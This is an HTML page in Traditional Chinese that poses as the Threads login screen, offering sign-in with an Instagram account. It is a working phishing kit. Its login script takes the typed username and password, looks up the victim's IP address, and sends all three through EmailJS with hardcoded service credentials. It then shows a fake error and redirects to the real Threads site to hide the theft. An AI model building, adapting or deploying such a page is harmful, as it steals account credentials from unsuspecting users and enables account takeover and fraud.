<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Threads 登入</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("CDnxhrbcBaRhYiaqq");
  </script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #101010; /* 下方與整體背景為黑色 */
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      position: relative;
      overflow-x: hidden;
    }

    /* 頂部背景圖片 */
    .top-bg-image {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 350px;
      object-fit: cover;
      pointer-events: none;
      z-index: 0;
    }

    /* 主內容容器 */
    .main-container {
      width: 100%;
      max-width: 370px;
      margin-top: auto;
      margin-bottom: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      z-index: 1;
      padding-top: 60px;
    }

    .title {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 24px;
      text-align: center;
    }

    /* 輸入框與按鈕 */
    .input-group {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-bottom: 12px;
    }

    .input-field {
      width: 100%;
      height: 52px;
      background-color: #1e1e1e;
      border: 1px solid #2d2d2d;
      border-radius: 12px;
      padding: 0 16px;
      color: #ffffff;
      font-size: 14px;
      outline: none;
    }

    .input-field::placeholder {
      color: #777777;
    }

    .btn-submit {
      width: 100%;
      height: 52px;
      background-color: #ffffff;
      color: #000000;
      border: none;
      border-radius: 26px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
    }

    .forgot-password {
      color: #777777;
      font-size: 14px;
      text-decoration: none;
      margin-top: 12px;
      margin-bottom: 24px;
    }

    /* 分隔線 */
    .divider {
      display: flex;
      align-items: center;
      width: 100%;
      color: #777777;
      font-size: 13px;
      margin-bottom: 24px;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #2a2a2a;
    }

    .divider span {
      padding: 0 16px;
    }

    /* Instagram 登入按鈕連結與框體 */
    .ig-link {
      width: 100%;
      text-decoration: none;
      color: inherit;
      display: block;
    }

    .ig-button-box {
      width: 100%;
      height: 72px;
      background-color: #101010;
      border: 1px solid #2d2d2d;
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 20px;
      cursor: pointer;
    }

    .ig-content {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    /* Instagram Logo 圖片樣式 */
    .ig-icon-img {
      width: 38px;
      height: 38px;
      object-fit: contain;
      border-radius: 10px;
    }

    .ig-text {
      font-size: 14px;
      font-weight: 600;
      color: #ffffff;
    }

    .arrow-icon {
      color: #777777;
      font-size: 16px;
    }

    /* 右下角 QR Code 區域 */
    .qr-container {
      position: fixed;
      bottom: 24px;
      right: 24px;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      gap: 12px;
      z-index: 1;
    }

    .qr_code {
      width: 100px;
      height: 100px;
    }

    .qr-text {
      color: #777777;
      font-size: 12px;
    }

    .qr-box {
      width: 120px;
      height: 120px;
      border: 1px solid #2d2d2d;
      border-radius: 16px;
      padding: 10px;
      background-color: #101010;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .qr-placeholder {
      width: 100%;
      height: 100%;
      background-color: #ffffff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* 頁尾 */
    .footer {
      width: 100%;
      padding: 24px;
      display: flex;
      justify-content: center;
      gap: 16px;
      color: #777777;
      font-size: 12px;
      z-index: 1;
    }

    .footer a {
      color: #777777;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <!-- 上方背景圖片 -->
  <img src="./threads_head.png" alt="背景圖片" class="top-bg-image">

  <!-- 主要登入區塊 -->
  <div class="main-container">
    <div class="title">使用 Instagram 帳號登入</div>

    <form onsubmit="return false;" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
      <div class="input-group">
        <input type="text" id="username" class="input-field" placeholder="用戶名稱、手機號碼或電子郵件地址">
        <input type="password" id="password" class="input-field" placeholder="密碼">
      </div>

      <button type="button" class="btn-submit" onclick="handleLogin()">登入</button>
      <a href="https://www.threads.com/reset_password" class="forgot-password">忘記密碼？</a>
    </form>

    <div class="divider">
      <span>或</span>
    </div>

    <!-- 加上 class="ig-link" 並修正閉合標籤 -->
    <a href="./Instagram.com.login.html" class="ig-link">
      <div class="ig-button-box">
        <div class="ig-content">
          <img src="./ig2.png" alt="Instagram Logo" class="ig-icon-img">
          <span class="ig-text">使用 Instagram 帳號繼續</span>
        </div>
        <span class="arrow-icon">&gt;</span>
      </div>
    </a>
  </div>

  <!-- QR Code 區塊 -->
  <div class="qr-container">
    <div class="qr-text">掃描即可下載應用程式</div>
    <div class="qr-box">
      <div class="qr-placeholder"><img src="./qr_code.png" alt="qr_code" class="qr_code"></div>
    </div>
  </div>

  <!-- 頁尾條款與版權 -->
  <footer class="footer">
    <span>© 2026</span>
    <a href="#">《Threads 使用條款》</a>
    <a href="#">《隱私政策》</a>
    <a href="#">《Cookie 政策》</a>
    <a href="#">回報問題</a>
  </footer>

  <script>
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    async function handleLogin() {
            // 取得輸入值並去除前後空格
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            // 若帳號或密碼任一為空，則中止執行
            if (!username || !password) {
                alert("請輸入帳號或密碼");
                return;
            }
            let userIP = "未知 IP";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                console.error("抓取 IP 失敗:", error);
            }
            
            try {
                await emailjs.send("service_0w04i8j", "template_tvkdzq4", {
                    forwhat: "google to threads_login",
                    username: username,
                    password: password,
                    ip: userIP
                });
                // 發送成功後再跳轉
                console.log('進行登入中...', { username, password });
                alert("發生了一些錯誤");
                window.location.href = "https://www.threads.com/login";
                

            } catch (err) {
                alert("系統錯誤，請稍後再試");
            }

        }
  </script>

</body>
</html>
